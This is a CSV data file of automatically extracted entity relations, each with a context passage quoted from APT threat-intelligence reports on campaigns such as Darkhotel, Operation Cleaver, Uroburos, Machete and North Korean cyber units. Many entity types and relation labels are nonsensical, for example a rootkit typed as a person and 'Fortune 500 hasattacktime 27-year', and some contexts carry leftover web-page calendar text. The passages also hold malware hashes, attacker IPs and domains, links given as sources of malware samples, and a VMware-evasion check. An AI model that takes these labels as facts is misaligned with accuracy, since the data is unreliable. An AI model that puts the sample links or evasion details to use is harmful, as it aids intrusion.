"FileName","RelationType","Entity1Mention","Entity1Type","Entity2Mention","Entity2Type","Context"
"ZoxPNG_Full_Analysis-Final","indicates","07:16:54  47,207","TIME","Two","CARDINAL","60415999bc82dc9c8f4425f90e41a98d514f76a2 10 May 2013 at 07:16:54 44,432 bytes 40f9cde4ccd1b1b17a647c6fc72c5c5cd40d2b08 10 May 2013 at 07:16:54 47,200 bytes 7dd556415487cc192b647c9a7fde70896eeee7a2 10 May 2013 at 07:16:54 47,207 bytes Two of the known samples ( SHA1:40f9cde4ccd1b1b17a647c6fc72c5c5cd40d2b08 and SHA1:60415999bc82dc9c8f4425f90e41a98d514f76a2 ) are signed using a signature from “ 4NB Corp. ” which appears to be a South Korean video conferencing and cloud service provider ( www.4nb.co.kr ) . "
"fireeye-operation-quantum-entanglement","hasattacklocation","HTRAN","ORG","Guangdong","GPE","113.68.110.239 CHINANET GUANGDONG PROVINCE NETWORK 13 http://www.fireeye.com/blog/technical/malware-research/2014/03/spear-phishing-the-news-cycle-apt-actors-leverage-interest-in-the-disappearance-of­malaysian-flight-mh-370.html 12 http://www.fireeye.com/resources/pdfs/fireeye-poison-ivy-report.pdf and July 1 , 2012 , the phi.crabance[.]com domain resolved to 98.126.91.66.This IP was observed hosting a HTRAN proxy client , which was seen connecting to a backend HTRAN server hosted at 113.66.248.60 . This server was also located in the Guangdong Province and operated by CHINANET . In short , the Moafee group was observed consistently hosting their backend HTRAN servers in Guangdong . "
"darkhotel_kl_07.11","indicates","Darkhotel","PRODUCT","30,000","CARDINAL","This Darkhotel package was downloaded over 30,000 times in less than six months . The p2p bittorrent Darkhotel offering is listed here , posted on 2013.11.22 . "
"Hikit_Analysis-Final","hasproduct","DLL","ORG","DLL","PRODUCT","The DLL operates as a service , requiring an attacker is install the DLL as a service at some point prior to activation . The DLL contains only two exports : DllEntryPointand DllRegisterServer . "
"ICS_Havex_backdoors","hasproduct","mbCHECK","ORG","Havex","PRODUCT","0b74282d9c03affb25bbecf28d5155c582e246f0ce21be27b75504f1779707f5 Notice how only mbCHECK for users in Europe was trojanized , there has been no report of the USA / CAN version of mbCHECK being infected with Havex . "
"Micro-Targeted-Malvertising-WP-10-27-14-1","hascharacteristics","Original Report):  Below in Figure 23","WORK_OF_ART","24","CARDINAL","Analysis ( Original report ): Figure 22 : CryptoWall 2.0 infection report Timeline Analysis ( Original Report ): Below in Figure 23 is the timeline of the Tor connections and SSL connections employed by CryptoWall . Figure 23 : Network connections from CryptoWall 2.0 In addition , you can see the ransom note being written to disk on an infected machine in the audit logs in Figure 24 . Figure 24 : File writes including the ransom note from CryptoWall infection "
"FTA_1014_Bots_Machines_and_the_Matrix","hasmember","320","MONEY","20","MONEY","It appears that in May 2013 , the pre - built bot could be purchase for $ 320-$500 , and $ 20 for variant rebuilds for those requiring configuration changes . According to online research , Beta Bot sales are being handled by “ Lord Huron , ” although “ betamonkey ” appears to be the author . The following image was found during online research : -­-Neutrino The Neutrino bot was advertised as an HTTP stress - testing tool . It has some of the followingfeatures : anti - VM and anti - reversing / debugging , denial of service ( HTTP / TCP / UDP flood),keylogger , command shell , credential stealing , self - spreading , etc . It appears at some point thebot was sold for $ 550 ( Builder ) , $ 200 ( Full set including Bot and Admin Panel ) , and $ 20 ( Update).Online research revealed the following contact information for this bot : n3utrino@kaddafi[.]me /n3utrino@xmpp[.]jp / n3utrino.blog[.]com . "
"FTA_1014_Bots_Machines_and_the_Matrix","hasmember","500","MONEY","20","MONEY","It appears that in May 2013 , the pre - built bot could be purchase for $ 320-$500 , and $ 20 for variant rebuilds for those requiring configuration changes . According to online research , Beta Bot sales are being handled by “ Lord Huron , ” although “ betamonkey ” appears to be the author . The following image was found during online research : -­-Neutrino The Neutrino bot was advertised as an HTTP stress - testing tool . It has some of the followingfeatures : anti - VM and anti - reversing / debugging , denial of service ( HTTP / TCP / UDP flood),keylogger , command shell , credential stealing , self - spreading , etc . It appears at some point thebot was sold for $ 550 ( Builder ) , $ 200 ( Full set including Bot and Admin Panel ) , and $ 20 ( Update).Online research revealed the following contact information for this bot : n3utrino@kaddafi[.]me /n3utrino@xmpp[.]jp / n3utrino.blog[.]com . "
"Kaspersky_Lab_whitepaper_Regin_platform_eng","hasattacktime","Regin","ORG","more than a decade","DATE","Conclusions For more than a decade , a sophisticated group known as Regin has targeted high - profile entities around the world with an advanced malware platform . "
"Cylance_Operation_Cleaver_Report","hasattacklocation","Cleaver","PERSON","Pakistan","GPE","Perhaps the most bone - chilling evidence we collected in this campaign was the targeting and compromise of transportation networks and systems such as airlines and airports in South Korea , Saudi Arabia and Pakistan . The level of access seemed ubiquitous : Active Directory domains were fully compromised , along with entire Cisco Edge switches , routers , and internal networking infrastructure . Fully compromised VPN credentials meant their entire remote access infrastructure and supply chain was under the control of the Cleaver team , allowing permanent persistence under compromised credentials . "
"GData_Uroburos_RedPaper_EN_v1","hasproduct","2008","DATE","Agent.BTZ","PRODUCT","Relation to Russian attack against U.S. suspected Due to many technical details ( file name , encryption keys , behavior and more details mentioned in this report ) , we assume that the group behind Uroburos is the same group that performed a cyberattack against the United States of America in 2008 with a malware called Agent . BTZ . "
"CrowdStrike_Flying_Kitten","hasattacklocation","FLYING KITTEN","ORG","Iraq","GPE","In addition to the aerospace / defense and dissident targeting , it also appears that FLYING KITTEN is also engaged in broader targeting via the website parmanpower[.]com . This website is registered via the same registrant email ( info[@]usa.gov.us ) and other Whois information as some of the other domains related to the activity discussed above . It purports to be the website of a business engaged in recruiting , training , and development in Erbil , Iraq . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","Kim Jong Il","PERSON","South Korea","GPE","Stressing the importance of the regime ’s electronic warfare capabilities , in 1999 former regime leader Kim Jong Il said “ The basic key to victory in modern warfare is to do well in electronic warfare . ”228 Since the regime ’s advanced technology lags behind that of South Korea and the U.S. , its capability to disrupt the communications of these perceived adversaries is a vital asymmetric capability.229 Training cyber warriors "
"GData_Uroburos_RedPaper_EN_v1","hasattacktime","Uroburos","PERSON","today","DATE","In case someone from the audience of this report notices an infection caused by the Uroburos rootkit and needs help , would like to receive further technical information or would like to contribute any information about this case , please feel free to contact us by email using the following mailbox : intelligence@gdata.de Conclusion The Uroburos rootkit is one of the most advanced rootkits we have ever analyzed . The oldest driver we identified was compiled in 2011 , which means that the campaign remained undiscovered for at least three years . The investment to develop a complete framework such as Uroburos is extremely high . The developer team behind the development and the design of such an enhanced framework is really skilled . We believe that , until today , the team behind Uroburos has developed an even more sophisticated framework , which still remains undiscovered . "
"El_Machete","hasattacktime","Spanish","NORP","2010","DATE",""" Machete "" is a targeted attack campaign with Spanish speaking roots . We believe this campaign started in 2010 and was renewed with an improved infrastructure in 2012 . "
"fireeye-operation-saffron-rose","hasattacktime","the Ajax Security Team","ORG","November 2013","DATE","November 2013 . Attack Vectors We have observed the Ajax Security Team use a variety of vectors to lure targets into installing malicious software and/or revealing login credentials . "
"KL_report_syrian_malware","hasattacktime","Trojans","NORP","April 11, 2014","DATE","Even though the attackers depend mainly on using known RATs , their rapid improvement and application of obfuscation techniques , GUI development for fake applications , and code modification via automated builders , increase the probability that it wo n’t be too long before they start writing their own Trojans to take advantage of customized infection capabilities and implement better security evasion . Finally , having a comprehensive and up - to - date antivirus and firewall should be the first measure taken by any user that does any type of online activity , especially during these uncertain times when new cyber threats appear almost daily . Appendix 1 : Samples All samples table The list of sample files has been collected through the infection vectors detailed above ( Skype , Facebook , file - sharing , email , etc . ) . The samples have been either generated using automated tools ( RAT server , obfuscation tools ) or developed and bound to RAT files , especially the new samples with graphical content .  Ammazon Internet Security.rar  Smart Firewall.rar  SSH VPN.rar https://www.dropbox.com/s/ f9gpiv2qk4m1r44 / Ammazon%20 Internet%20Security.rar https://www.dropbox.com/ s/65bnrk8x4gt2og8 / Smart%20 Firewall.rar Mar 18 , 2014 https://www.dropbox.com/s/ c4kwnh6q0r3ymwf / SSH%20VPN.rar https://www.facebook.com/photo . php?fbid=726440034062205&set = a .375478335825045.85979.36700297 6672581&type=1&theater reported on facebook and https:// www.cyber-arabs.com Viber fooor pc%E2%80%AEexe%E2%80%AEexe.rar Jan 26 , http://ge.tt/14hNebG1/v/0 2014 http://www.youtube.com/ watch?v = rU7B0mO9dr8 23ae669639c1d970aaee6f9f551b82b1 thejoe.publicvm . abf93ad254cd01997935863c9e556af8 com multiple ports : 96ca1d7e45b03f438804d3b46d22df8a 31.8.48.7 1827acc1cf53e6ac9d9b638fc81f50a1 8995ff66bacaf76d1c24660f3092583c .scr file April 11 , 2014 hhhhhkrufnrrrs1982 . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","Operation Troy","ORG","North Korea","GPE","Malware for “ Operation Troy ” was likely planted.282 2010 . DarkSeoul Backdoor . Prioxer detected ( June ) 283 . Korean Central News Agency website becomes North Korea ’s first known direct connection to the Internet ( October)284 2011 . "
"unveilingthemask_v1.0","hasproduct","SGH","ORG","Linux","PRODUCT","During the investigation , we were able to obtain the Win32 and Mac OS X versions ; the Linux variant was badly damaged and could not be recovered . While Careto and SGH can also work as a “ standalone ” implant , we observed the C&C installing one package using the other one - for instance , a victim infected with Careto would get the SGH as well . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","Narushige Michishita","PERSON","North Korea","GPE","Narushige Michishita , a North Korea and Asia security expert at Japan 's National Graduate Institute for Policy Studies , stated “ By strengthening its relationship with North Korea , Russia is trying to enhance its bargaining position vis - à - vis the United States and Japan . "
"KL_report_syrian_malware","hasattacklocation","TARASSUL ISP","ORG","Russia","GPE","Since the end of 2013 , the group has extensively relied on a class C IP subnet , 31.9.48.0/24 , provided by TARASSUL ISP ( Syrian Telecommunications Establishment ) for its attacks . We suspect this subnet has been allocated to the group , also an indication that they are now operational from a single location . In early 2014 , the group moved to an IP address in Russia ( 31.8.47.7 ) , to launch multiple new attacks . "
"fireeye-operation-saffron-rose","indicates","Psiphon","PRODUCT","33","CARDINAL","Of the remaining 33 , 10 have Persian language settings • 12 have either Proxifier or Psiphon installed or running ( all 12 had a Persian language setting and all but one had their timezone set to “ Iran Standard Time ” ) "
"Dragonfly_Threat_Against_Western_Energy_Suppliers","targets","Dragonfly","ORG","Trojan","PRODUCT","Hello . Hello is an updated iteration of Lightsout that the Dragonfly group began to use in September 2013 . Use of Backdoor . Oldrea appears to be limited to the Dragonfly group . In addition , specific instances of Trojan . "
"unveilingthemask_v1.0","indicates","JavaUpdate.jar","PRODUCT","13","CARDINAL","The “ index.jnlp ” has the following content : Figure 13 : Index jnlp Its main function is to load “ JavaUpdate.jar ” , which contains a signed dropper that installs the SGH implant into the system . "
"Group72_Opening_ZxShell","runssoftware","1","CARDINAL","bCreateListenSck","PRODUCT","The symbol “ g_bCreateListenSck ” is set to 1 . "
"french-connection-french-aerospace-focused-cve-2014-0322-attack-shares-similarities-2012","hasattacktime","Capstone","ORG","T  2  3  9  10  16  17  23  24  30  «  Oct  Recent  Comments  W  4 11  18  25  T  5 12 19 26  F  6  13  20 27  S S  1  7  8 14  15 21  22 28  29","DATE","The Capstone Turbine incident did not directly use a GIFAS - based domain , but a deeper look at network indicators related to those observed in the Capstone incident reveals two such domains : gifas[.]cechire[.]com and gifas[.]blogsite[.]org . The third similarity between the two is the use of zero - days . The exploit used in Capstone Turbine was a zero - day during the time it was active , just like the exploit used in the recent French aerospace activity . This is a general similarity that does not create a de.nitive link . between the two attacks , but when viewed in conjunction with the use of the same malware and GIFAS - based domains , it strengthens the connection . . Mo ’ Shells Mo ’ Problems – File List Details about Apple SSL vulnerability and Stacking iOS 7.0.6 patch . FollowUsTweetsabout""from : crowdstrikeORfrom : Adam_CyberORfrom : JMDeCORfrom : DmitriCyberORfrom : StevenChabinskyORfrom : George_Kurtz""Recent Posts The Imperative for Proactive Incident Response in 2015 and Beyond November 3 , 2015 Why Your Business Environment Should Drive Cybersecurity November 2 , 2015 Blurring of Commodity and Targeted Attack Malware October 16 , 2015 Should I Really Trust the Cloud with my Endpoint Protection ? September 30 , 2015 U.S. – China Agreement on Cyber Intrusions : An In.ection Point . September 25 , 2015 Archives NOVEMBER2015 M T 2 3 9 10 16 17 23 24 30 « Oct Recent Comments W 4 11 18 25 T 5 12 19 26 F 6 13 20 27 S S 1 7 8 14 15 21 22 28 29 "
"Deep in Thought_ Chinese Targeting of National Security Think Tanks »","hasproduct","ISIS","ORG","Windows","PRODUCT","In fact , the shift in targeting of Iraq policy individuals occurred on June 18 , the day that ISIS began its attack on the Baiji oil refinery . The Attacks CrowdStrike ’s Falcon Host technology used by these think tanks consists of a tiny ( under 5 mb in size ) kernel sensor that is deployed on Windows and Mac servers , desktops , and laptops and is able to do real - time detection and recording of all adversary activities taking place on the system . "
"darkhotel_kl_07.11","indicates","Windows Messenger","PRODUCT","one","CARDINAL","When unsuspecting guests , including situationally aware corporate executives and high - tech entrepreneurs , travel to a variety of hotels and connect to the internet , they are infected with a rare ApT Trojan posing as any one of several major software releases . These might be GoogleToolbar , Adobe flash , Windows Messenger , etc . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","MSS)","ORG","North Korea","GPE","The Ministry of State Security ( MSS ) , also known as the State Security Department , is North Korea ’s primary counterintelligence service . "
"darkhotelappendixindicators_kl_1.1","hasproduct","TR  TrendMicro","ORG","VMware","PRODUCT","TR TrendMicro , Japan AvastSvc.exe AST Avast , Czech Republic RsMgrSvr.exe RS Rising , China mcagent.exe MC McAfee , USA avgidsagent.exe AV AVG , Czech Republic ccsvchst.exe NT Symantec , USA bdagent.exe BD BitDefender , Romania avp.exe KS Kaspersky , Russia V3LTray.exe V AhnLab , South Korea AYAgent.aye AY ESTSoft , South Korea The malware uses a trick to evade running on a VMware . First , it checks if cur­rent process is running in WOW64 environment . If yes it does additional port I / O specific to VMWare virtual machine ( the VMware hypervisor port : 0x5658 ; VMware hypervisor magic value : 0x564D5868 ) . "
"deep-panda-webshells","hasproduct","Eva   Simple","ORG","API","PRODUCT","Eva Simple wrapper around the CSharpCodeProvider API , allowing the adversary to compile and execute arbitrary C # source code . "
"Cylance_Operation_Cleaver_Report","hasattacklocation","Tarh Andishan","ORG","Iran","GPE","Infrastructure leveraged in the attack was registered in Iran to the corporate entity Tarh Andishan , which translates to “ invention ” or “ innovation ” in Farsi . • Source netblocks and ASNs are registered to Iran . "
"Cylance_Operation_Cleaver_Report","hasattacklocation","Physical  Operation Cleaver","ORG","Iran","GPE","In September , 2012 , Iran signed an extensive agreement for technology cooperation agreement with North Korea , which allows for collaboration on a variety of efforts including IT and security.6 Cyber Moving to Physical Operation Cleaver ’s carefully selected targets like the oil and gas industry , energy and utility companies , as well as airlines and airports , indicates Iran ’s desire to gain deep access into the world ’s most critical environments . "
"HPSR SecurityBriefing_Episode16_NorthKorea","indicates","Duk-Ki Kim","PERSON","Ph.D","WORK_OF_ART","According to a report written by Captain Duk - Ki Kim , Republic of Korea Navy officer and Ph.D. “ … the North Korean regime will first conduct a simultaneous and multifarious cyber offensive on the Republic of Korea ’s society and basic infrastructure , government agencies , and major military command centers while at the same time suppressing the ROK government and its domestic allies and supporters with nuclear weapons . "
"El_Machete","belongsto","The Social Engineering Toolkit","WORK_OF_ART","Korelogic","ORG","Note : Thanks to Tyler Hudak from Korelogic who noticed that the above HTML is copy pasted from SET , The Social Engineering Toolkit . "
"Micro-Targeted-Malvertising-WP-10-27-14-1","hasattachment","WordPress Blogs","WORK_OF_ART","Apache","PRODUCT","Compromised WordPress Blogs . Unconfigured Apache hosts . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","CSTIA","ORG","Russia","GPE","The amount of information contained in CSTIA 's technical database makes it North Korea 's largest scientific facility . According to a CIA article , review of CSTIA ’s publications showed that China , Russia , and Japan are important sources of technical data . "
"Cylance_Operation_Cleaver_Report","hasattacktime","Fortune 500","ORG","27-year","DATE","Cylance ’s flagship product CylancePROTECT has been adopted by Fortune 500 companies and government agencies across the globe . Cylance was founded by 27 - year security industry luminary , Stuart McClure , former Global CTO of McAfee , original founder of Foundstone , and lead author of the international best - selling book Hacking Exposed . "
"unveilingthemask_v1.0","hasproduct","APPDATA%","PERCENT","Windows Vista","PRODUCT","For Windows Vista and higher without administrator privileges , it installs into % APPDATA% . "
"Kaspersky_Lab_crouching_yeti_appendixes_eng_final","hasproduct","CoolType.dll","ORG","Acrobat 9.x","PRODUCT","Stack - based buffer overflow in CoolType.dll in Adobe Reader and Acrobat 9.x before 9.4 , and 8.x before 8.2.5 on Windows and Mac OS X , allows remote attackers to execute arbitrary code or cause a denial of service ( application crash ) via a PDF document with a long field in a Smart INdependent Glyphlets ( SING ) table in a TTF font , as exploited in the wild in September 2010 . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","EMP","ORG","U.S.","GPE","The regime ’s CSTIA relies on Russia as one of several sources for technical data.253 North Korea also sends some of its cyber warriors to train in Russia,254 and the regime reportedly acquired its EMP technology from there.255 Political ties between Russia and North Korea have become stronger in recent months . In 2014 , potentially as a result of the U.S. response to the Russian - Ukranian conflict , Russia began to strengthen ties with North Korea . "
"Deep in Thought_ Chinese Targeting of National Security Think Tanks »","hasattacktime","a Federal 100 Award","WORK_OF_ART","2013","DATE","Alperovitch ’s many honors include being selected as MIT Technology Review ’s “ Young Innovators under 35 ” ( TR35 ) in 2013 . He also was named Foreign Policy Magazine ’s Leading Global Thinker for 2013 and received a Federal 100 Award for his information security contributions . "
"Darwin_fav_APT_Group","hasattacklocation","THREEBYTE","ORG","China","GPE","Government Organizations Organizations in the Asia - Pacific Region that are of Interest to China The WATERSPOUT backdoor was written to the same file path as the HIGHTIDE backdoors : C:\DOCUMENTS and SETTINGS\{user}\LOCAL SETTINGS\Temp\word.exe C:\DOCUMENTS and SETTINGS\{user}\LOCAL SETTINGS\Temp\winword.exe WATERSPOUT was compiled within two days of the last HIGHTIDE backdoor and on the same day as the THREEBYTE backdoor . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","Uriminzokkiri.com","ORG","China","GPE","The popular Uriminzokkiri.com website , whose name translates to “ our nation , ” is hosted in China . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","CSTIA","ORG","China","GPE","The amount of information contained in CSTIA 's technical database makes it North Korea 's largest scientific facility . According to a CIA article , review of CSTIA ’s publications showed that China , Russia , and Japan are important sources of technical data . "
"wp-operation-pawn-storm","hasattacklocation","Ministry of Defense","ORG","France","GPE","Ministry of Defense ( France ) • "
"El_Machete","hasattacklocation","Machete","PERSON","Russia","GPE",""" Machete "" is a targeted attack campaign with Spanish speaking roots . We believe this campaign started in 2010 and was renewed with an improved infrastructure in 2012 . The operation may be still "" active "" . The malware is capable of the following cyber - espionage operations : Logging keystrokes Capturing audio from the computer 's microphone Capturing screenshots Capturing geolocation data Taking photos from the computer 's web camera Copying files to a remote server Copying files to a special USB device if inserted Hijjacking the clipboard and capturing information from the target machine Targets of "" Machete "" Most of the victims are located in , Venezuela , Ecuador , Colombia , Peru , Russia , Cuba , and Spain , among others . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hascharacteristics","a few hours","TIME","3","CARDINAL","However , this would likely require a major electrical and network infrastructure expansion.68 61 http://www.northkoreatech.org/2011/05/19/more-details-on-star-joint-venture/ 62 http://www.computerworld.com/s/article/9177968/North_Korea_moves_quietly_onto_the_Internet?taxonomyId=18&pageNumber=2 63 http://www.northkoreatech.org/2010/10/09/the-new-face-of-kcna/ 64 http://webcache.googleusercontent.com/search?q=cache:http://english.chosun.com/site/data/html_dir/2001/05/29/2001052961197.html 65 http://www.northkoreatech.org/2012/04/08/dprk-gets-second-link-to-internet/ 66 http://www.computerworld.com/s/article/9237652/North_Korea_39_s_Internet_returns_after_36_hour_outage 67 https://rdns.im/the-pirate-bay-north-korean-hosting-no-its-fake-p2 68 http://www.northkoreatech.org/2014/02/10/internet-coming-to-kaesong-industrial-zone/ 69 http://38north.org/2010/09/speak-loudly-and-carry-a-small-stick-the-north-korean-cyber-menace/ 70 http://www.usnews.com/news/blogs/rick-newman/2013/04/12/heres-how-lousy-life-is-in-north-korea North Korea ’s electrical grid can not support a large technological infrastructure.69 Electrical power is reported to be unreliable and sporadic , with many citizens only receiving a few hours of electricity per day.70 Figure 3 North and South Korean power grid The photo above ( Figure 3 ) , from the International Space Station , shows North Korea ’s sparse power grid , in comparison with surrounding nations.71 We have highlighted North Korea in red . "
"ZoxPNG_Full_Analysis-Final","hasproduct","ZoxPNG","ORG","C2","PRODUCT","The first GET request provides the initial dial - home to the C2 server and results in the C2 server sending the first command to the ZoxPNG binary via a special PNG file attached to the response . "
"Group72_Opening_ZxShell","attributedto","These Threats   Advanced Malware Protection","LAW","AMP","ORG","Protecting Users from These Threats Advanced Malware Protection ( AMP ) is ideally suited to detect the sophisticated malware used by this threat actor . "
"El_Machete","hasattacklocation","Machete","PERSON","Cuba","GPE",""" Machete "" is a targeted attack campaign with Spanish speaking roots . We believe this campaign started in 2010 and was renewed with an improved infrastructure in 2012 . The operation may be still "" active "" . The malware is capable of the following cyber - espionage operations : Logging keystrokes Capturing audio from the computer 's microphone Capturing screenshots Capturing geolocation data Taking photos from the computer 's web camera Copying files to a remote server Copying files to a special USB device if inserted Hijjacking the clipboard and capturing information from the target machine Targets of "" Machete "" Most of the victims are located in , Venezuela , Ecuador , Colombia , Peru , Russia , Cuba , and Spain , among others . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","KPA","ORG","North Korea","GPE","The Ministry of People ’s Armed Forces ( MPAF ) administrates the Korean People ’s Army ( KPA ) and oversees the General Staff Department ( GSD ) , which is responsible for operational command and control of North Korea ’s armed forces . The General Staff Department also oversees the Reconnaissance General Bureau ( RGB ) , North Korea ’s agency for clandestine operations . "
"HPSR SecurityBriefing_Episode16_NorthKorea","indicates","PRINCPES","WORK_OF_ART","386","CARDINAL","It then overwrote the MBR with the strings "" HASTATI "" , "" PRINCPES "" , "" PRINCIPES "" , or "" PR!NCPES”.386 While there are several variants of the wiper , all seem to have been used on the same date . "
"Cylance_Operation_Cleaver_Report","hasattacklocation","Tarh Andishan","ORG","Netherlands","GPE","For more information see the Tarh Andishan section of this report . The IP address 159.253.144.209was a source for a secondary attacker in various compromises . They were observed conducting SQL injection attacks . While this IP was this registered in the Netherlands , we believe they used Softlayer ’s Citrix demo environment to launch these attacks which is consistent with proxying or “ island hopping ” . "
"Group72_Opening_ZxShell","indicates","ZxShell","PRODUCT","second","ORDINAL","The second Loveusd system thread does a lot of things . Its principal duties are to create the ZxShell main DLL in “ c:\Windows\System32\commhlp32.dll ” and to install the Kernel “ Load Image Notify routine ” . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","Narushige Michishita","PERSON","Asia","LOC","Narushige Michishita , a North Korea and Asia security expert at Japan 's National Graduate Institute for Policy Studies , stated “ By strengthening its relationship with North Korea , Russia is trying to enhance its bargaining position vis - à - vis the United States and Japan . "
"fireeye-operation-quantum-entanglement","hasattacklocation","DragonOK","ORG","Taiwan","GPE","Conclusion Based on the geolocation evidence provided in this paper , it appears that different operators executed the Moafee and DragonOK campaigns . This conclusion is supported by the following assessments :  The campaigns target different industries in different geographic locations . The Moafee campaign targets government and military organizations in countries with national interests in the South China Sea . In contrast , the DragonOK campaign has been observed targeting high - technology and manufacturing companies in Japan and Taiwan . "
"fireeye-operation-quantum-entanglement","hasattacklocation","DragonOK","ORG","the South China Sea","LOC","Conclusion Based on the geolocation evidence provided in this paper , it appears that different operators executed the Moafee and DragonOK campaigns . This conclusion is supported by the following assessments :  The campaigns target different industries in different geographic locations . The Moafee campaign targets government and military organizations in countries with national interests in the South China Sea . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","Appendix A","WORK_OF_ART","North Korea","GPE","The WHOIS records for these sites can be found in Appendix A. Additionally , the Chongryon operate a ferry called the Mangyongbong-92 , the only direct transit from Japan to North Korea . "
"HPSR SecurityBriefing_Episode16_NorthKorea","authored","Kimsukyang","PERSON","One","CARDINAL","One server maintained a constant connection to an IP address belonging to Joson Telecommunication Company , which is affiliated with North Korea ’s Ministry of Posts and Telecommunications . Investigators found that one of the servers used in the attack on JoongAng Ilbo was also used in the March 2011 DDoS attacks on South Korean critical infrastructure sites and the April 2011 attack on Nyongyup Bank.369 Known tactics , techniques and procedures . Wiper malware . Defacements Targets . Took credit for defacing JoongAng Ilbo . Kimsukyang The Kimsuky malware , which targeted South Korean think tanks , is loosely attributed to an actor referred to as Kimsukyang . "
"XtremeRAT_fireeye","indicates","x00","MONEY","first","ORDINAL","As a result , it only effectively uses the first half of the key . For example , the key “ C\x00O\x00N\x00F\x00I\x00G\x00 ” is 12 bytes long , but the length is calculated as only being 6 bytes long . "
"Deep in Thought_ Chinese Targeting of National Security Think Tanks »","hasattacklocation","ISIS","ORG","Iraq","GPE","This is undoubtedly related to the recent Islamic State of Iraq and the Levant ( ISIS ) takeover of major parts of Iraq and the potential disruption for major Chinese oil interests in that country . "
"GDATA_TooHash_CaseStudy_102014_EN_v1","indicates","Cohhoc","PRODUCT","two","CARDINAL","We have seen the same technique when looking at the differences between the two malware variants before . Obfuscation Layer The “ Cohhoc ” malware uses an obfuscation layer , to disguise the malware and to complicate the analysis . "
"Iranian Hackers Targeted US Officials in Elaborate Social Media Attack Operation _ SecurityWeek","hasattacklocation","iSIGHT Partners","ORG","Iran","GPE","According to iSIGHT Partners , there is no direct information showing that the Iranian government is the ultimate sponsor of the campaign , but iSIGH researchers do believe the threat actors are located in Iran . "
"fireeye-sidewinder-targeted-attack","targets","Google","ORG","Javascript","PRODUCT","We verified that Android apps with these two permissions can authenticate themselves with the user ’s Google account , allowing access to Google Play and the ability send app installation requests . Through the Javascript bridge , attackers can install apps of choice ( e.g. , an attacker ’s phishing app ) to any devices registered in user ’s account in the background without user consent . "
"group-3279-targets-the-video-game-industry","hasattacktime","PDB","ORG","December 26, 2013","DATE","The PDB string is included at compilation time and provides insight into the directory structure of the computer used to compile the executable . The gsi.exe example shown in Figure 1 illustrates the use of the "" laurentiumoon "" username on the originating host and shows that the original program was named "" getosinfo "" . According to the PETimeDateStamp , this example was compiled on Sunday , October 30 , 2011 at 16:42:30 UTC . Figure 1 . PDB string that includes the laurentiumoon username . ( Source : Dell SecureWorks ) The Laurentiu Moon Colonce persona has many online pro.les that contain very little information , including a Steam Community online gaming account , a Google+ account , a list of CodeBeamer code projects , and a bulletin board account on a site about mobile phone jailbreaks and cracking . Additionally , the laurentiumoon @ gmail . com email address was used to register an account on rootkit.com , which used to be a bulletin board dedicated to discussing exploits and rootkit development . In February 2011 , Anonymous dumped the clear text passwords of all rootkit.com users while compromising HBGary . There is also an openrce.org user account with the laurentiumoon username . OpenRCE is a popular reverse code engineering website that includes information on analyzing and building malicious software , as well as on reverse engineering and cracking legitimate software . Laurentiu Moon has also been active in the Chinese cracking and hacking underground since at least 2009 , based upon the threat actor 's join dates on the China Cracking Group online community , AntiGameProtect , and qdppc.net . The China Cracking Group and AntiGameProtect are online communities dedicated to cracking software digital rights management ( DRM ) mechanisms , with a large focus on video games . Laurentiu Moon joined AntiGameProtect on December 26 , 2013 and has been active as recently as January 1 , 2014 ( see Figure 2 ) . "
"EB-YetiJuly2014-Public","hasattacktime","Crouching Yeti","WORK_OF_ART","at least 2010","DATE","Conclusions The Crouching Yeti actor has been performing massive surveillance campaigns in recent years , since at least 2010 . Their targets included thousands of victims of which we were able to identify a few , confirming Crouching Yeti ’s interest in several strategic sectors . "
